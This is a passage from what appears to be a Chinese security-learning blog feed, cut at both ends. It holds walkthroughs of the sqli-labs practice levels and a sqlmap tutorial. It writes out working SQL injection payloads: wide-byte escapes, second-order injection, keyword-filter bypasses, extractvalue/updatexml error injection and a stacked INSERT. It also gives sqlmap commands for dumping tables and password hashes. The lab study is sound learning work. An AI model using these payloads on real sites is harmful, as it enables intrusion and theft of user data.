href="#服务器（两层）架构" class="headerlink" title="服务器（两层）架构"></a>服务器（两层）架构</h2><img src="/2020/12/14/sqli-labs%E5%85%AD/16.jpg" style="zoom: 67%;"><p>服务器端有两个部分：第一部分为tomcat为引擎的jsp型服务器，第二部分为apache为引擎的php服务器，真正提供web服务的是php服务器。工作流程如上图，apache解析最后一个参数，Tomcat（jsp）解析第一个参数。tomcat服务器处做数据过滤和处理，功能类似为一个WAF。因为解析参数的不同，我们可以利用该原理绕过WAF的检测。该用法就是http参数污染攻击的一个应用。HPP可对服务器和客户端都能够造成一定的威胁。推荐教程：<a href="https://www.cnblogs.com/lcamry/p/5762961.html">服务器两层架构</a></p><p>单引号报错：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/17.jpg" alt="17"></p><p>注释后回显正常：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/18.jpg" alt="18"></p><p>不再赘述。</p><h1 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h1><p>登录，发现转义</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/19.jpg" alt="19"></p><p>查看源码:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/21.jpg" alt="21"></p><p>此关为宽字节注入，在之前文章SQL基础里有介绍，推荐解码网站：<a href="http://www.mytju.com/classcode/tools/urldecode_gb2312.asp">GBK解码</a>，</p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>添加%df,构造宽字节注入漏洞：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/20.jpg" alt="20" style="zoom: 33%;"><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>%5c表示\ ，如果能将返回的结果中对于单引号没有转义字符进行处理，如用字母组合使其形成宽字节，从而使\（斜杠）失效，也可达到宽字节漏洞，例如用%c’ccc和%5c进行组合，这里hh可随意。</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/22.jpg" alt="22"></p><p>效果如下:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/23.jpg" alt="23"></p><p>不再赘述。</p><h1 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h1><p>单引号仍出现转义，查看源码：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/24.jpg" alt="24"></p><p>这一关使用的是addslashes()函数过滤。</p><p>addslashes()：返回在预定义字符之前添加反斜杠的字符串。用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<strong>PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。因此不应对已转义过的字符串使用  addslashes()，这样会导致双层转义</strong></p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>NULL</li></ul><h1 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h1><p>登录：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/25.jpg" alt="25"></p><p>还是存在转义，之前的关卡是get型的方式以url形式提交的，因此数据会通过URLencode，而现在是post型。</p><h3 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h3><p>介绍一个新知识(详细教程：<a href="https://blog.csdn.net/guxiaonuan/article/details/78678043">字符编码的概念</a>)</p><p>Unicode 可以使用的编码有三种，分别是：</p><ul><li>UFT-8：一种变长的编码方案，使用 1~6 个字节来存储；</li><li>UFT-32：一种固定长度的编码方案，不管字符编号大小，始终使用 4 个字节来存储；</li><li>UTF-16：介于 UTF-8 和 UTF-32 之间，使用 2 个或者 4 个字节来存储，长度既固定又可变。</li></ul><p>将utf-8转换为utf-16或 utf-32，例如将 ‘ 转为utf-16为 �’。</p><h4 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h4><p>登录如下：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/26.jpg" alt="26"></p><p>查库：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/27.jpg" alt="27" style="zoom:50%;"><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><img src="/2020/12/14/sqli-labs%E5%85%AD/28.jpg" alt="28"></p><h3 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><p>在火狐效仿前几关用%df’宽字节注入：<code>uname=-1%df&#39; &amp;passwd=123&amp;submit=Submit</code>发现不行？？</p><p>抓个包:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/30.jpg" alt="30"></p><p>发现奇奇怪怪的转义，所以只能在burp suite更改：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/29.jpg" alt="29"></p><h1 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h1><p>这关有点奇怪，数字型注入还对<code>&#39;</code>转义？？？按照流程正常注入即可，后期遇到<code>&#39;security&#39;</code>在进行编码即可。</p><h1 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h1><p>get宽字节注入，换了个函数:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/31.jpg" alt="31"></p><p>对以下字符转义:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- \x00</span><br><span class="line">- \n</span><br><span class="line">- \r</span><br><span class="line">- \</span><br><span class="line">- &#39;</span><br><span class="line">- &quot;</span><br><span class="line">- \x1a</span><br></pre></td></tr></table></figure><p>跟之前一样:</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/32.jpg" alt="32"></p><p>or</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/33.jpg" alt="33"></p><p>火狐好像对<code>%df&#39;</code>有恶意，执行会报错，以上是用Microsoft Edge执行的。</p><h1 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h1><p>本关与 34 关是大致相似的,post宽字节注入，区别在于处理 post 内容用的是 mysql_real_escape_string()<br> 函数，而不是 addslashes()函数，但是原理是一样的，</p><h1 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h1><h4 id="Stacked-injection"><a href="#Stacked-injection" class="headerlink" title="Stacked injection"></a>Stacked injection</h4><p>多条sql语句一起执行，和union语句有点像，但是union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句，但并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。在web系统中，代码只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，在前端界面无法看到返回结果。</p><p>源代码：</p><img src="/2020/12/14/sqli-labs%E5%85%AD/34.jpg" alt="34" style="zoom: 80%;"><p>发现多个函数:<a href="https://link.jianshu.com/?t=http://www.runoob.com/php/func-mysqli-more-results.html">PHP mysqli_more_results() 函数</a> <a href="https://link.jianshu.com/?t=http://www.runoob.com/php/func-mysqli-multi-query.html">PHP mysqli_multi_query() 函数</a> <a href="https://link.jianshu.com/?t=http://php.net/manual/zh/mysqli.store-result.php">mysqli_store_result</a>，经查询均与连接数据库有关。</p><p>试探为单引号，进行插入：<code>id=1&#39;;insert into users(id,username,password) values (38,&#39;111&#39;,&#39;222&#39;)--+</code></p><p>查询数据库：</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/35.jpg" alt="35"></p><p>成功插入。</p><h1 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h1><p>试探为数字型注入，一样的操作</p><p><img src="/2020/12/14/sqli-labs%E5%85%AD/36.jpg" alt="36"></p><p>40,41关也一样，少了回显,不赘述。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs五</title>
    <link href="/2020/12/09/sqli-labs%E4%BA%94/"/>
    <url>/2020/12/09/sqli-labs%E4%BA%94/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><p>本关跟第一关有点像，但是试探过程中发现<code>id=1&#39;</code>和<code>id=&#39;)</code>报错，但注释后仍报错，而<code>id=1&quot;</code>和<code>id=1&quot;)</code>回显正常，看一下源代码</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/1.jpg" alt="1"></p><p>发现本关对–+和#都进行了转义，故不能再用这种方式注释，可以在之后构造出闭合用;%00(一种特殊的注释符)或者and和or语句进行闭合。通过试探得出该处为单引号注入：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/2.jpg" alt="2"></p><p>其余步骤与第一关相似，在每条语句后面加上<code>and&#39;1&#39;=&#39;1</code>闭合即可。</p><h1 id="Less-24（二次注入）"><a href="#Less-24（二次注入）" class="headerlink" title="Less-24（二次注入）"></a>Less-24（二次注入）</h1><p>二次注入思路：</p><ul><li>先构造语句（有被转义字符的语句或SQL语句）提交 HTTP 数据请求到服务 端进行处理</li><li>服务端保存数据，为应用程序提供原始输入数据并响应客户端请求</li><li>向服务端发送第二个与第一次不相同的请求数据信息</li><li>服务端接收到请求，查询数据库中已经存储的数据信息并处理，从而第一次请求中构造的语句在服务端环境中执行</li><li>服务端返回执行的处理结果数据信息，可以通过返回的结果判断二次注入漏洞利用是否成功</li></ul><p>页面中出现Forgot your password?点进去额……去攻击它???只能点New User click here?注册。</p><p>查看login.php源代码:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/15.jpg" alt="15"></p><p>登录时用户名和密码都被过滤。</p><p>查看login_create.php源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/16.jpg" alt="16"></p><p>可插入用户名和密码</p><p>pass_change.php源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/14.jpg" alt="14"></p><p>更改密码时，用户名没有过滤，sql语句中对用户名加了单引号。</p><p>注册用户名为admin’#密码随意：</p><img src="/2020/12/09/sqli-labs%E4%BA%94/17.jpg" alt="17" style="zoom: 50%;"><p>修改密码后使用新密码重新登录，发现无法登录，查看数据库</p><img src="/2020/12/09/sqli-labs%E4%BA%94/18.jpg" alt="18" style="zoom:80%;"><p>发现admin的密码变成了新密码，而原本注册的用户密码不变，因为在创建admin‘#之后，这个账号再次检索的时候不用进行转义检测，所以搜索到的数据库名时admin，并不是admin’#，所以修改的密码也是admin的密码，所以登录的时候，username应该是admin，而不是admin‘#。</p><h1 id="Less-25-绕过注入"><a href="#Less-25-绕过注入" class="headerlink" title="Less-25(绕过注入)"></a>Less-25(绕过注入)</h1><p>正常登录后，开始测试，加上单引号，报错，注释掉回显正常，故为单引号注入，接下来<code>orser by 3 --+</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/4.jpg" alt="4"></p><p>发现回显不正常，hint提示我们语句中的or两个字母没有了,查一下源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/5.jpg" alt="5"></p><p>or 和and被注释掉了。</p><h2 id="法一：双写的联合查询"><a href="#法一：双写的联合查询" class="headerlink" title="法一：双写的联合查询"></a>法一：双写的联合查询</h2><p>使用双写的方法，把or和and的每一个字母之间，使用or或and分隔开即可:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/6.jpg" alt="6"></p><p>后续和第一关一样，在遇到or和and时要双写。如下需对password进行双写<code>?id=-1&#39; union select 1,(select group_concat(concat_ws(&#39;-&#39;,id,username,passwoorrd)) from users),3-- #</code>:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/7.jpg" alt="7"></p><h2 id="法二：报错注入or-gt"><a href="#法二：报错注入or-gt" class="headerlink" title="法二：报错注入or-&gt;||"></a>法二：报错注入<code>or-&gt;||</code></h2><p><code>?id=1&#39; || extractvalue(1,concat(0x7e,database()))--+</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/8.jpg" alt="8"></p><p>发现or可以用||代替而and用&amp;&amp;代替报错。原因是&amp;&amp;进行url编码，变成了%26%26：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/9.jpg" alt="9"></p><h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><p>本关可以正常union注入也可以用Bool或Time盲注，但不能报错注入：<img src="/2020/12/09/sqli-labs%E4%BA%94/10.jpg" alt="10"></p><p>源代码中将报错注释掉了。</p><p>试探一番发现为数字型输入，其余步骤与25关相似。</p><h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><p>单引号报错，将其注释后仍报错，发现注释符消失</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/11.jpg" alt="11"></p><p>查看源代码:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/12.jpg" alt="12"></p><p>发现一堆符号被注释了，所以要像给or找个替代符号一样，给其他的被转义的符号找个替代：</p><ul><li><p><code>;%00</code>注释符</p></li><li><p><code>%0a</code> 新建一行</p></li><li><p><code>%0b</code> TAB 键（垂直）</p></li><li><p><code>%0c</code> 新的一页</p></li><li><p><code>%0d</code> return 功能</p></li><li><p><code>%a0</code> 空格</p></li><li><p><code>%09</code> TAB 键（水平）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%23(#)&#96;、&#96;%2a(*)&#96;、&#96;%2d(-)&#96;、&#96;%2f(&#x2F;)&#96;、&#96;%5c(\)</span><br></pre></td></tr></table></figure></li></ul><p>有三种注入方式：</p><ul><li><p>因正确回显非固定字符串，可利用以上特殊 URL 编码代替空格，仍使用<code>union</code>加空格连接<code>select</code>联合注入。</p><p>将单引号注释掉:<code>?id=0%27%a0||%a0%271%27=%271</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/20.jpg" alt="20"></p><p>回显正常，故为单引号注入</p><p><code>?id=0&#39;%a0union%a0select%a02,database(),4%a0||%a0&#39;1&#39;=&#39;1</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/19.jpg" alt="19"></p><p>接下去和之前类似，注意字符转换。</p></li><li><p>updatexml()与extractvalue()报错注入</p><p><code>?id=0&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;=&#39;1</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/21.jpg" alt="21"></p><p>接下去同理。</p></li><li><p>Bool 盲注，构造注入语句避开空格。</p></li></ul><h1 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h1><p><code>?id=1&#39;</code>无回显，双引号回显正常查看源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/22.jpg" alt="22"></p><p>图中48行将报错注释掉，故此关不能使用报错注入，or,and等符号一样被注释掉了。将单引号注释掉仍无回显，用<code>?id=1&#39;)||&#39;1&#39;=(&#39;1</code>进行注释回显正常故为‘）闭合型注入。</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/23.jpg" alt="23"></p><p>其余步骤与26关类似<strong>但不可用报错注入</strong>。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>less-24登录报错解决方法</title>
    <link href="/2020/12/06/24/"/>
    <url>/2020/12/06/24/</url>
    
    <content type="html"><![CDATA[<p>十二月一号的时候打靶场打到第24关，按正常步骤先进行注册后页面如下：</p><p><img src="/2020/12/06/24/2.jpg" alt="2"></p><p>无法跳转到初始登录页面，且出现警告，然后我以为这只是正常警告就手动点击home键返回</p><p>用刚注册的账号登录出现如下页面:</p><p><img src="/2020/12/06/24/1.jpg" alt="1"></p><p>无法正常登录，然后我根据警告内容查看了login.php文件，查不出什么错误。之后就去百度，搜到两种解法，第一种是logged-in文件有错误，我重新下了sqli-labs的压缩包替换，结果一样……第二种是修改php.ini文件里的output_buffering = Off，将Off改为On；将session.auto_start = 0 改为session.auto_start = 1 。改完后需要重启apache，我按照这个方法改了如下文件里的配置</p><p><img src="/2020/12/06/24/3.jpg" alt="3"></p><p>发现还是不行，依旧是那个页面，然后我就卡在24关到今天，卡了快一周…….</p><p>就在今天，我发现了另一个文件:</p><p><img src="/2020/12/06/24/4.jpg" alt="4"></p><p>这个文件的类型为设置配置！！！我改了这个文件的相关参数，再次登录发现成功登录了!!</p><p><img src="/2020/12/06/24/17.jpg" alt="17"></p><p>所以只需在此文件里改信息…….因为登录问题卡了快一周的东西就这么解决了。。</p><p>至于为什么这么做查到的解释是：用txt文件编辑过function.php、wp-login.php、pluggable.php 这三个PHP文件导致UTF8编码和BOM冲突，UTF8文件的BOM（Byte Order Mark)标志，在保存的时候会自动存入！</p><p>然后问题就解决了~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2020/12/01/sqlmap/"/>
    <url>/2020/12/01/sqlmap/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>sqlmap终于终于搭好了，之前的python环境没搭好，下了好多次换过2.X和3.X，设置环境变量的时候还不小心将path变量删了导致博客崩了……之后sqlmap解压错根目录了…终于把sqlmap搭好了想打靶场，发现还需要有抓包工具，于是又去搭java环境,下Burp Suite。现在终于可以了!!!</p><h1 id="Sqlmap简介"><a href="#Sqlmap简介" class="headerlink" title="Sqlmap简介"></a>Sqlmap简介</h1><p>五种注入模式：布尔盲注，时间盲注，报错注入，联合查询，堆查询</p><p>支持的数据库：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><p>七种等级:</p><ul><li>0 只显示python错误以及严重的信息。</li><li>1 同时显示基本信息和警告信息。（默认）</li><li>2 同时显示debug信息。</li><li>3 同时显示洼入的payload</li><li>4 同时显示HTTP请求</li><li>5 同时显示HTTP响应头</li><li>6 同时显示HTTP响应页面。</li></ul><p>常用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">-a, --all&#x2F;&#x2F;获取所有信息</span><br><span class="line"></span><br><span class="line">-b, --banner&#x2F;&#x2F;获取数据库管理系统的标识</span><br><span class="line"></span><br><span class="line">--current-user&#x2F;&#x2F;获取数据库管理系统当前用户</span><br><span class="line"></span><br><span class="line">--current-db&#x2F;&#x2F;获取数据库管理系统当前数据库</span><br><span class="line"></span><br><span class="line">--hostname&#x2F;&#x2F;获取数据库服务器的主机名称</span><br><span class="line"></span><br><span class="line">--is-dba&#x2F;&#x2F;检测DBMS当前用户是否DBA</span><br><span class="line"></span><br><span class="line">--users&#x2F;&#x2F;枚举数据库管理系统用户</span><br><span class="line"></span><br><span class="line">--passwords&#x2F;&#x2F;枚举数据库管理系统用户密码哈希</span><br><span class="line"></span><br><span class="line">--privileges&#x2F;&#x2F;枚举数据库管理系统用户的权限</span><br><span class="line"></span><br><span class="line">--roles&#x2F;&#x2F;枚举数据库管理系统用户的角色</span><br><span class="line"></span><br><span class="line">--dbs&#x2F;&#x2F;枚举数据库管理系统数据库</span><br><span class="line"></span><br><span class="line">--tables&#x2F;&#x2F;枚举的DBMS数据库中的表</span><br><span class="line"></span><br><span class="line">--columns&#x2F;&#x2F;枚举DBMS数据库表列</span><br><span class="line"></span><br><span class="line">--schema&#x2F;&#x2F;枚举数据库架构</span><br><span class="line"></span><br><span class="line">--count&#x2F;&#x2F;检索表的项目数，获取表中的数据个数:sqlmap.py -u url --count -D testdb</span><br><span class="line"></span><br><span class="line">--dump&#x2F;&#x2F;转储数据库表项</span><br><span class="line"></span><br><span class="line">--dump-all&#x2F;&#x2F;转储数据库所有表项</span><br><span class="line"></span><br><span class="line">--search&#x2F;&#x2F;搜索列（S），表（S）和&#x2F;或数据库名称（S）</span><br><span class="line"></span><br><span class="line">--comments&#x2F;&#x2F;获取DBMS注释</span><br><span class="line"></span><br><span class="line">-D DB&#x2F;&#x2F;要进行枚举的指定数据库名</span><br><span class="line"></span><br><span class="line">-T TBL&#x2F;&#x2F;DBMS数据库表枚举</span><br><span class="line"></span><br><span class="line">-C COL&#x2F;&#x2F;DBMS数据库表列枚举</span><br><span class="line"></span><br><span class="line">-X EXCLUDECOL&#x2F;&#x2F;DBMS数据库表不进行枚举</span><br><span class="line"></span><br><span class="line">-U USER&#x2F;&#x2F;用来进行枚举的数据库用户</span><br><span class="line"></span><br><span class="line">--exclude-sysdbs&#x2F;&#x2F;枚举表时排除系统数据库</span><br><span class="line"></span><br><span class="line">--start&#x3D;LIMITSTART&#x2F;&#x2F;获取第一个查询输出数据位置</span><br><span class="line"></span><br><span class="line">--stop&#x3D;LIMITSTOP&#x2F;&#x2F;获取最后查询的输出数据</span><br><span class="line"></span><br><span class="line">--first&#x3D;FIRSTCHAR&#x2F;&#x2F;第一个查询输出字的字符获取</span><br><span class="line"></span><br><span class="line">--last&#x3D;LASTCHAR&#x2F;&#x2F;最后查询的输出字字符获取</span><br><span class="line"></span><br><span class="line">--sql-query&#x3D;QUERY&#x2F;&#x2F;要执行的SQL语句</span><br><span class="line"></span><br><span class="line">--sql-shell&#x2F;&#x2F;提示交互式SQL的shell</span><br><span class="line"></span><br><span class="line">--sql-file&#x3D;SQLFILE&#x2F;&#x2F;要执行的SQL文件</span><br></pre></td></tr></table></figure><p>技术分类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">–technique：</span><br><span class="line">B：布尔盲注</span><br><span class="line">E：报错</span><br><span class="line">U：联合</span><br><span class="line">S：堆叠</span><br><span class="line">T：时间</span><br><span class="line">Q：内联查询</span><br></pre></td></tr></table></figure><h1 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h1><h4 id="1-先测试是否存在注入"><a href="#1-先测试是否存在注入" class="headerlink" title="1.先测试是否存在注入"></a>1.先测试是否存在注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/1.jpg" alt="1"></p><p>红框框中语句表明存在注入，有时候也可能不存在SQL注入。逐个测试会挺麻烦的可以批量检测，将目标url整理为txt文件，当文件保存为hhh.txt时使用“sqlmap.py-m hhh.txt”，注意<strong>hhh.txt跟sqlmap在同一个目录下</strong></p><h4 id="2-查库"><a href="#2-查库" class="headerlink" title="2.查库"></a>2.查库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] --current-db&#x2F;&#x2F;列出当前数据库</span><br></pre></td></tr></table></figure><p><code>dbs</code>表示列出说有数据库，batch可以自动选择，也可以省略，但省略后就需要手动选择<img src="/2020/12/01/sqlmap/2.jpg" alt="2"></p><h4 id="3-查表"><a href="#3-查表" class="headerlink" title="3.查表"></a>3.查表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] --tables --batch</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/3.jpg" alt="3"></p><h4 id="4-查列"><a href="#4-查列" class="headerlink" title="4.查列"></a>4.查列</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T[‘表名’] --columns --batch</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/4.jpg" alt="4"></p><h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump --batch</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/5.jpg" alt="5"></p><p>关与关之间需要清除sqlmap缓存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py --purge</span><br></pre></td></tr></table></figure><h1 id="Post型"><a href="#Post型" class="headerlink" title="Post型"></a>Post型</h1><p>先用burp suite抓个包，保存到文件里</p><p><img src="/2020/12/01/sqlmap/6.jpg" alt="6"></p><p>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;C:\Users\32270\Desktop\hhh.txt&quot; --leve&#x3D;5 --risk&#x3D;3 --dbs</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/7.jpg" alt="7"></p><p>查表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r &quot;C:\Users\32270\Desktop\hhh.txt &quot; -D security --tables --batch</span><br></pre></td></tr></table></figure><p><img src="/2020/12/01/sqlmap/8.jpg" alt="8"></p><p>接下去跟get型一样。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（四）</title>
    <link href="/2020/11/26/sqli-labs%E5%9B%9B/"/>
    <url>/2020/11/26/sqli-labs%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>基于错误的用户代理，头部POST注入.</p><p>补充几个请求头：</p><blockquote><ul><li><code>Host</code><br> Host请求报头域主要用于指定被请求资源的Internet主机和端口号。</li><li><code>User-Agent</code><br> User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。</li><li><code>Referer</code><br> Referer包含一个URL，代表当前访问URL的上一个URL。</li><li><code>Cookie</code><br> Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。</li><li><code>Range</code><br> Range可以请求实体的部分内容。</li><li><code>X-Forwarded-For</code><br> X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。</li><li><code>Accept</code><br> Accept请求报头域用于指定客户端接收哪些<a href="https://www.cnblogs.com/tjudzj/p/6528008.html">MIME类型</a>的信息。</li><li><code>Accept-Charset</code><br> Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。</li></ul></blockquote><h4 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h4><p>在用户名和密码注入都只回显最初的ip地址，查找源代码</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/1.jpg" alt="1"></p><p>本关对用户名和密码做了check_input()处理，故无法注入。但在用admin登录成功时发现页面有user agent 信息猜测可在其注入，但由于这里执行的语句是insert,所以不能像之前一样用#将后面的语句给注释掉。当#注释掉后面就无法正常插入执行 SQL语句。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/2.jpg" alt="2"></p><p>查找源代码验证了猜测</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/3.jpg" alt="3"></p><p>注意:这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。<strong>17关对密码进行了更改,故此处记得用新密码，或者在靶场初页面重置，否则无法登录</strong>，本人用admin登录了半天登不进去，后来才反应过来17关改密码了…………</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/4.jpg" alt="4"></p><h3 id="（一）hackbar插件"><a href="#（一）hackbar插件" class="headerlink" title="（一）hackbar插件:"></a>（一）hackbar插件:</h3><h3 id="extractvalue（）"><a href="#extractvalue（）" class="headerlink" title="extractvalue（）"></a>extractvalue（）</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h4><p>先试单引号</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/7.jpg" alt="7"></p><p>报错，再闭合，回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/6.jpg" 